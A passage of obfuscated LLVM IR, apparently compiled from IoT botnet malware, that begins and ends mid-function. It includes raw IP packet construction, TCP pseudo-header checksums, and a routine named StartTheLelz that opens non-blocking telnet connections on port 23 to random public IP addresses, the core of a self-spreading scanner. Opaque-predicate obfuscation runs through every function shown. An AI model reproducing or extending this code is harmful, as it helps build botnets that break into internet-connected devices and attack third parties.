  %30 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 1
  store i64 %29, i64* %30, align 8
  %31 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 2
  store i8 0, i8* %31, align 8
  %32 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 3
  store i8 6, i8* %32, align 1
  %33 = call zeroext i16 @htons(i16 zeroext 20) #13
  %34 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %13, i32 0, i32 4
  store i16 %33, i16* %34, align 2
  store i32 44, i32* %15, align 4
  %35 = load i32, i32* %15, align 4
  %36 = sext i32 %35 to i64
  %37 = call noalias i8* @malloc(i64 %36) #2
  %38 = bitcast i8* %37 to i16*
  store i16* %38, i16** %16, align 8
  %39 = load i16*, i16** %16, align 8
  %40 = bitcast i16* %39 to i8*
  %41 = bitcast %struct.tcp_pseudo* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %40, i8* %41, i64 24, i32 1, i1 false)
  %42 = load i16*, i16** %16, align 8
  %43 = bitcast i16* %42 to i8*
  %44 = getelementptr inbounds i8, i8* %43, i64 24
  %45 = load %struct.tcphdr*, %struct.tcphdr** %12, align 8
  %46 = bitcast %struct.tcphdr* %45 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %44, i8* %46, i64 20, i32 1, i1 false)
  %47 = load i16*, i16** %16, align 8
  %48 = load i32, i32* %15, align 4
  %49 = call zeroext i16 @csum(i16* %47, i32 %48)
  store i16 %49, i16* %17, align 2
  %50 = load i16*, i16** %16, align 8
  %51 = bitcast i16* %50 to i8*
  call void @free(i8* %51) #2
  %52 = load i16, i16* %17, align 2
  %53 = load i32, i32* @x.57
  %54 = load i32, i32* @y.58
  %55 = sub i32 %53, 1
  %56 = mul i32 %53, %55
  %57 = urem i32 %56, 2
  %58 = icmp eq i32 %57, 0
  %59 = icmp slt i32 %54, 10
  %60 = or i1 %58, %59
  br i1 %60, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  ret i16 %52

originalBBalteredBB:                              ; preds = %originalBB, %2
  %61 = alloca %struct.iphdr*, align 8
  %62 = alloca %struct.tcphdr*, align 8
  %63 = alloca %struct.tcp_pseudo, align 8
  %64 = alloca i16, align 2
  %65 = alloca i32, align 4
  %66 = alloca i16*, align 8
  %67 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %61, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %62, align 8
  %68 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %69 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %68, i32 0, i32 2
  %70 = load i16, i16* %69, align 2
  store i16 %70, i16* %64, align 2
  %71 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %72 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %71, i32 0, i32 8
  %73 = load i32, i32* %72, align 4
  %74 = zext i32 %73 to i64
  %75 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 0
  store i64 %74, i64* %75, align 8
  %76 = load %struct.iphdr*, %struct.iphdr** %61, align 8
  %77 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %76, i32 0, i32 9
  %78 = load i32, i32* %77, align 4
  %79 = zext i32 %78 to i64
  %80 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 1
  store i64 %79, i64* %80, align 8
  %81 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 2
  store i8 0, i8* %81, align 8
  %82 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 3
  store i8 6, i8* %82, align 1
  %83 = call zeroext i16 @htons(i16 zeroext 20) #13
  %84 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %63, i32 0, i32 4
  store i16 %83, i16* %84, align 2
  store i32 44, i32* %65, align 4
  %85 = load i32, i32* %65, align 4
  %86 = sext i32 %85 to i64
  %87 = call noalias i8* @malloc(i64 %86) #2
  %88 = bitcast i8* %87 to i16*
  store i16* %88, i16** %66, align 8
  %89 = load i16*, i16** %66, align 8
  %90 = bitcast i16* %89 to i8*
  %91 = bitcast %struct.tcp_pseudo* %63 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %90, i8* %91, i64 24, i32 1, i1 false)
  %92 = load i16*, i16** %66, align 8
  %93 = bitcast i16* %92 to i8*
  %94 = getelementptr inbounds i8, i8* %93, i64 24
  %95 = load %struct.tcphdr*, %struct.tcphdr** %62, align 8
  %96 = bitcast %struct.tcphdr* %95 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %94, i8* %96, i64 20, i32 1, i1 false)
  %97 = load i16*, i16** %66, align 8
  %98 = load i32, i32* %65, align 4
  %99 = call zeroext i16 @csum(i16* %97, i32 %98)
  store i16 %99, i16* %67, align 2
  %100 = load i16*, i16** %66, align 8
  %101 = bitcast i16* %100 to i8*
  call void @free(i8* %101) #2
  %102 = load i16, i16* %67, align 2
  br label %originalBB
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: noinline nounwind uwtable
define void @makeIPPacket(%struct.iphdr*, i32, i32, i8 zeroext, i32) #0 {
  %6 = alloca %struct.iphdr*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8, align 1
  %10 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i8 %3, i8* %9, align 1
  store i32 %4, i32* %10, align 4
  %11 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %12 = bitcast %struct.iphdr* %11 to i8*
  %13 = load i8, i8* %12, align 4
  %14 = and i8 %13, -16
  %15 = or i8 %14, 5
  store i8 %15, i8* %12, align 4
  %16 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %17 = bitcast %struct.iphdr* %16 to i8*
  %18 = load i8, i8* %17, align 4
  %19 = and i8 %18, 15
  %20 = or i8 %19, 64
  store i8 %20, i8* %17, align 4
  %21 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %22 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %21, i32 0, i32 1
  store i8 0, i8* %22, align 1
  %23 = load i32, i32* %10, align 4
  %24 = sext i32 %23 to i64
  %25 = add i64 20, %24
  %26 = trunc i64 %25 to i16
  %27 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %28 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %27, i32 0, i32 2
  store i16 %26, i16* %28, align 2
  %29 = call i32 @rand_cmwc()
  %30 = trunc i32 %29 to i16
  %31 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %32 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %31, i32 0, i32 3
  store i16 %30, i16* %32, align 4
  %33 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %34 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %33, i32 0, i32 4
  store i16 0, i16* %34, align 2
  %35 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %36 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %35, i32 0, i32 5
  store i8 -1, i8* %36, align 4
  %37 = load i8, i8* %9, align 1
  %38 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %39 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %38, i32 0, i32 6
  store i8 %37, i8* %39, align 1
  %40 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %41 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %40, i32 0, i32 7
  store i16 0, i16* %41, align 2
  %42 = load i32, i32* %8, align 4
  %43 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %44 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %43, i32 0, i32 8
  store i32 %42, i32* %44, align 4
  %45 = load i32, i32* %7, align 4
  %46 = load %struct.iphdr*, %struct.iphdr** %6, align 8
  %47 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %46, i32 0, i32 9
  store i32 %45, i32* %47, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @sclose(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %4 = load i32, i32* %3, align 4
  %5 = icmp sgt i32 3, %4
  br i1 %5, label %6, label %7

; <label>:6:                                      ; preds = %1
  store i32 1, i32* %2, align 4
  br label %26

; <label>:7:                                      ; preds = %1
  %8 = load i32, i32* @x.61
  %9 = load i32, i32* @y.62
  %10 = sub i32 %8, 1
  %11 = mul i32 %8, %10
  %12 = urem i32 %11, 2
  %13 = icmp eq i32 %12, 0
  %14 = icmp slt i32 %9, 10
  %15 = or i1 %13, %14
  br i1 %15, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %7
  %16 = load i32, i32* %3, align 4
  %17 = call i32 @close(i32 %16)
  store i32 0, i32* %2, align 4
  %18 = load i32, i32* @x.61
  %19 = load i32, i32* @y.62
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %originalBBpart2, %6
  %27 = load i32, i32* %2, align 4
  ret i32 %27

originalBBalteredBB:                              ; preds = %originalBB, %7
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @close(i32 %28)
  store i32 0, i32* %2, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @StartTheLelz(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca i8*, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i8*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %16 = call i32 @getdtablesize() #2
  %17 = sdiv i32 %16, 4
  %18 = mul nsw i32 %17, 3
  store i32 %18, i32* %3, align 4
  %19 = load i32, i32* %3, align 4
  %20 = icmp sgt i32 %19, 4096
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %1
  br label %24

; <label>:22:                                     ; preds = %1
  %23 = load i32, i32* %3, align 4
  br label %24

; <label>:24:                                     ; preds = %22, %21
  %25 = phi i32 [ 4096, %21 ], [ %23, %22 ]
  %26 = load i32, i32* @x.63
  %27 = load i32, i32* @y.64
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  store i32 %25, i32* %3, align 4
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %34, align 4
  %35 = call zeroext i16 @htons(i16 zeroext 23) #13
  %36 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %35, i16* %36, align 2
  %37 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %38 = getelementptr inbounds [8 x i8], [8 x i8]* %37, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %38, i8 0, i64 8, i32 4, i1 false)
  %39 = load i32, i32* %3, align 4
  %40 = zext i32 %39 to i64
  %41 = call i8* @llvm.stacksave()
  store i8* %41, i8** %11, align 8
  %42 = alloca %struct.telstate_t, i64 %40, align 16
  %43 = bitcast %struct.telstate_t* %42 to i8*
  %44 = load i32, i32* %3, align 4
  %45 = sext i32 %44 to i64
  %46 = mul i64 %45, 5
  call void @llvm.memset.p0i8.i64(i8* %43, i8 0, i64 %46, i32 16, i1 false)
  store i32 0, i32* %4, align 4
  %47 = load i32, i32* @x.63
  %48 = load i32, i32* @y.64
  %49 = sub i32 %47, 1
  %50 = mul i32 %47, %49
  %51 = urem i32 %50, 2
  %52 = icmp eq i32 %51, 0
  %53 = icmp slt i32 %48, 10
  %54 = or i1 %52, %53
  br i1 %54, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %55

; <label>:55:                                     ; preds = %90, %originalBBpart2
  %56 = load i32, i32* %4, align 4
  %57 = load i32, i32* %3, align 4
  %58 = icmp slt i32 %56, %57
  br i1 %58, label %59, label %93

; <label>:59:                                     ; preds = %55
  %60 = load i32, i32* @x.63
  %61 = load i32, i32* @y.64
  %62 = sub i32 %60, 1
  %63 = mul i32 %60, %62
  %64 = urem i32 %63, 2
  %65 = icmp eq i32 %64, 0
  %66 = icmp slt i32 %61, 10
  %67 = or i1 %65, %66
  br i1 %67, label %originalBB9, label %originalBB9alteredBB

originalBB9:                                      ; preds = %originalBB9alteredBB, %59
  %68 = load i32, i32* %4, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %69
  %71 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %70, i32 0, i32 3
  store i8 1, i8* %71, align 1
  %72 = call noalias i8* @malloc(i64 1024) #2
  %73 = load i32, i32* %4, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %74
  %76 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %75, i32 0, i32 8
  store i8* %72, i8** %76, align 8
  %77 = load i32, i32* %4, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %78
  %80 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %79, i32 0, i32 8
  %81 = load i8*, i8** %80, align 8
  call void @llvm.memset.p0i8.i64(i8* %81, i8 0, i64 1024, i32 1, i1 false)
  %82 = load i32, i32* @x.63
  %83 = load i32, i32* @y.64
  %84 = sub i32 %82, 1
  %85 = mul i32 %82, %84
  %86 = urem i32 %85, 2
  %87 = icmp eq i32 %86, 0
  %88 = icmp slt i32 %83, 10
  %89 = or i1 %87, %88
  br i1 %89, label %originalBBpart211, label %originalBB9alteredBB

originalBBpart211:                                ; preds = %originalBB9
  br label %90

; <label>:90:                                     ; preds = %originalBBpart211
  %91 = load i32, i32* %4, align 4
  %92 = add nsw i32 %91, 1
  store i32 %92, i32* %4, align 4
  br label %55

; <label>:93:                                     ; preds = %55
  %94 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 5, i64* %94, align 8
  %95 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 0, i64* %95, align 8
  br label %96

; <label>:96:                                     ; preds = %1847, %93
  %97 = load i32, i32* @x.63
  %98 = load i32, i32* @y.64
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB13, label %originalBB13alteredBB

originalBB13:                                     ; preds = %originalBB13alteredBB, %96
  %105 = load i32, i32* @x.63
  %106 = load i32, i32* @y.64
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart215, label %originalBB13alteredBB

originalBBpart215:                                ; preds = %originalBB13
  br label %113

; <label>:113:                                    ; preds = %originalBBpart215
  store i32 0, i32* %4, align 4
  br label %114

; <label>:114:                                    ; preds = %1844, %113
  %115 = load i32, i32* %4, align 4
  %116 = load i32, i32* %3, align 4
  %117 = icmp slt i32 %115, %116
  br i1 %117, label %118, label %1847

; <label>:118:                                    ; preds = %114
  %119 = load i32, i32* @x.63
  %120 = load i32, i32* @y.64
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %118
  %127 = load i32, i32* %4, align 4
  %128 = sext i32 %127 to i64
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 2
  %131 = load i8, i8* %130, align 8
  %132 = zext i8 %131 to i32
  %133 = load i32, i32* @x.63
  %134 = load i32, i32* @y.64
  %135 = sub i32 %133, 1
  %136 = mul i32 %133, %135
  %137 = urem i32 %136, 2
  %138 = icmp eq i32 %137, 0
  %139 = icmp slt i32 %134, 10
  %140 = or i1 %138, %139
  br i1 %140, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  switch i32 %132, label %1843 [
    i32 0, label %141
    i32 1, label %394
    i32 2, label %646
    i32 3, label %781
    i32 4, label %881
    i32 5, label %1117
    i32 6, label %1217
    i32 7, label %1425
    i32 8, label %1453
    i32 9, label %1497
    i32 10, label %1557
    i32 11, label %1601
  ]

; <label>:141:                                    ; preds = %originalBBpart219
  %142 = load i32, i32* %4, align 4
  %143 = sext i32 %142 to i64
  %144 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %143
  %145 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %144, i32 0, i32 8
  %146 = load i8*, i8** %145, align 8
  call void @llvm.memset.p0i8.i64(i8* %146, i8 0, i64 1024, i32 1, i1 false)
  %147 = load i32, i32* %4, align 4
  %148 = sext i32 %147 to i64
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %148
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %149, i32 0, i32 3
  %151 = load i8, i8* %150, align 1
  %152 = icmp ne i8 %151, 0
  br i1 %152, label %153, label %173

; <label>:153:                                    ; preds = %141
  %154 = load i32, i32* %4, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %155
  %157 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %156, i32 0, i32 8
  %158 = load i8*, i8** %157, align 8
  store i8* %158, i8** %13, align 8
  %159 = load i32, i32* %4, align 4
  %160 = sext i32 %159 to i64
  %161 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %160
  %162 = bitcast %struct.telstate_t* %161 to i8*
  call void @llvm.memset.p0i8.i64(i8* %162, i8 0, i64 32, i32 16, i1 false)
  %163 = load i8*, i8** %13, align 8
  %164 = load i32, i32* %4, align 4
  %165 = sext i32 %164 to i64
  %166 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %165
  %167 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %166, i32 0, i32 8
  store i8* %163, i8** %167, align 8
  %168 = call i32 @getRandomPublicIP()
  %169 = load i32, i32* %4, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %170
  %172 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %171, i32 0, i32 1
  store i32 %168, i32* %172, align 4
  br label %244

; <label>:173:                                    ; preds = %141
  %174 = load i32, i32* %4, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %175
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %176, i32 0, i32 5
  %178 = load i8, i8* %177, align 1
  %179 = add i8 %178, 1
  store i8 %179, i8* %177, align 1
  %180 = load i32, i32* %4, align 4
  %181 = sext i32 %180 to i64
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %181
  %183 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %182, i32 0, i32 5
  %184 = load i8, i8* %183, align 1
  %185 = zext i8 %184 to i64
  %186 = icmp eq i64 %185, 14
  br i1 %186, label %187, label %214

; <label>:187:                                    ; preds = %173
  %188 = load i32, i32* @x.63
  %189 = load i32, i32* @y.64
  %190 = sub i32 %188, 1
  %191 = mul i32 %188, %190
  %192 = urem i32 %191, 2
  %193 = icmp eq i32 %192, 0
  %194 = icmp slt i32 %189, 10
  %195 = or i1 %193, %194
  br i1 %195, label %originalBB21, label %originalBB21alteredBB

originalBB21:                                     ; preds = %originalBB21alteredBB, %187
  %196 = load i32, i32* %4, align 4
  %197 = sext i32 %196 to i64
  %198 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %197
  %199 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %198, i32 0, i32 5
  store i8 0, i8* %199, align 1
  %200 = load i32, i32* %4, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %201
  %203 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %202, i32 0, i32 4
  %204 = load i8, i8* %203, align 2
  %205 = add i8 %204, 1
  store i8 %205, i8* %203, align 2
  %206 = load i32, i32* @x.63
  %207 = load i32, i32* @y.64
  %208 = sub i32 %206, 1
  %209 = mul i32 %206, %208
  %210 = urem i32 %209, 2
  %211 = icmp eq i32 %210, 0
  %212 = icmp slt i32 %207, 10
  %213 = or i1 %211, %212
  br i1 %213, label %originalBBpart227, label %originalBB21alteredBB

originalBBpart227:                                ; preds = %originalBB21
  br label %214

; <label>:214:                                    ; preds = %originalBBpart227, %173
  %215 = load i32, i32* @x.63
  %216 = load i32, i32* @y.64
  %217 = sub i32 %215, 1
  %218 = mul i32 %215, %217
  %219 = urem i32 %218, 2
  %220 = icmp eq i32 %219, 0
  %221 = icmp slt i32 %216, 10
  %222 = or i1 %220, %221
  br i1 %222, label %originalBB29, label %originalBB29alteredBB

originalBB29:                                     ; preds = %originalBB29alteredBB, %214
  %223 = load i32, i32* %4, align 4
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %224
  %226 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %225, i32 0, i32 4
  %227 = load i8, i8* %226, align 2
  %228 = zext i8 %227 to i64
  %229 = icmp eq i64 %228, 6
  %230 = load i32, i32* @x.63
  %231 = load i32, i32* @y.64
  %232 = sub i32 %230, 1
  %233 = mul i32 %230, %232
  %234 = urem i32 %233, 2
  %235 = icmp eq i32 %234, 0
  %236 = icmp slt i32 %231, 10
  %237 = or i1 %235, %236
  br i1 %237, label %originalBBpart231, label %originalBB29alteredBB

originalBBpart231:                                ; preds = %originalBB29
  br i1 %229, label %238, label %243

; <label>:238:                                    ; preds = %originalBBpart231
  %239 = load i32, i32* %4, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %240
  %242 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %241, i32 0, i32 3
  store i8 1, i8* %242, align 1
  br label %1844

; <label>:243:                                    ; preds = %originalBBpart231
  br label %244

; <label>:244:                                    ; preds = %243, %153
  %245 = load i32, i32* @x.63
  %246 = load i32, i32* @y.64
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %244
  %253 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 2, i16* %253, align 4
  %254 = call zeroext i16 @htons(i16 zeroext 23) #13
  %255 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %254, i16* %255, align 2
  %256 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 3
  %257 = getelementptr inbounds [8 x i8], [8 x i8]* %256, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %257, i8 0, i64 8, i32 4, i1 false)
  %258 = load i32, i32* %4, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %259
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %260, i32 0, i32 1
  %262 = load i32, i32* %261, align 4
  %263 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %264 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %263, i32 0, i32 0
  store i32 %262, i32* %264, align 4
  %265 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %266 = load i32, i32* %4, align 4
  %267 = sext i32 %266 to i64
  %268 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %267
  %269 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %268, i32 0, i32 0
  store i32 %265, i32* %269, align 16
  %270 = load i32, i32* %4, align 4
  %271 = sext i32 %270 to i64
  %272 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %271
  %273 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %272, i32 0, i32 0
  %274 = load i32, i32* %273, align 16
  %275 = bitcast %struct.timeval* %12 to i8*
  %276 = call i32 @setsockopt(i32 %274, i32 1, i32 20, i8* %275, i32 16) #2
  %277 = load i32, i32* %4, align 4
  %278 = sext i32 %277 to i64
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %278
  %280 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %279, i32 0, i32 0
  %281 = load i32, i32* %280, align 16
  %282 = bitcast %struct.timeval* %12 to i8*
  %283 = call i32 @setsockopt(i32 %281, i32 1, i32 21, i8* %282, i32 16) #2
  %284 = load i32, i32* %4, align 4
  %285 = sext i32 %284 to i64
  %286 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %285
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %286, i32 0, i32 0
  %288 = load i32, i32* %287, align 16
  %289 = icmp eq i32 %288, -1
  %290 = load i32, i32* @x.63
  %291 = load i32, i32* @y.64
  %292 = sub i32 %290, 1
  %293 = mul i32 %290, %292
  %294 = urem i32 %293, 2
  %295 = icmp eq i32 %294, 0
  %296 = icmp slt i32 %291, 10
  %297 = or i1 %295, %296
  br i1 %297, label %originalBBpart235, label %originalBB33alteredBB

originalBBpart235:                                ; preds = %originalBB33
  br i1 %289, label %298, label %315

; <label>:298:                                    ; preds = %originalBBpart235
  %299 = load i32, i32* @x.63
  %300 = load i32, i32* @y.64
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBB37, label %originalBB37alteredBB

originalBB37:                                     ; preds = %originalBB37alteredBB, %298
  %307 = load i32, i32* @x.63
  %308 = load i32, i32* @y.64
  %309 = sub i32 %307, 1
  %310 = mul i32 %307, %309
  %311 = urem i32 %310, 2
  %312 = icmp eq i32 %311, 0
  %313 = icmp slt i32 %308, 10
  %314 = or i1 %312, %313
  br i1 %314, label %originalBBpart239, label %originalBB37alteredBB

originalBBpart239:                                ; preds = %originalBB37
  br label %1844

; <label>:315:                                    ; preds = %originalBBpart235
  %316 = load i32, i32* %4, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %317
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %318, i32 0, i32 0
  %320 = load i32, i32* %319, align 16
  %321 = load i32, i32* %4, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %322
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %323, i32 0, i32 0
  %325 = load i32, i32* %324, align 16
  %326 = call i32 (i32, i32, ...) @fcntl(i32 %325, i32 3, i8* null)
  %327 = or i32 %326, 2048
  %328 = call i32 (i32, i32, ...) @fcntl(i32 %320, i32 4, i32 %327)
  %329 = load i32, i32* %4, align 4
  %330 = sext i32 %329 to i64
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %42, i64 %330
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %331, i32 0, i32 0
  %333 = load i32, i32* %332, align 16
  %334 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
  %335 = call i32 @connect(i32 %333, %struct.sockaddr* %334, i32 16)
  %336 = icmp eq i32 %335, -1
  br i1 %336, label %337, label %368

; <label>:337:                                    ; preds = %315
  %338 = load i32, i32* @x.63
  %339 = load i32, i32* @y.64
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
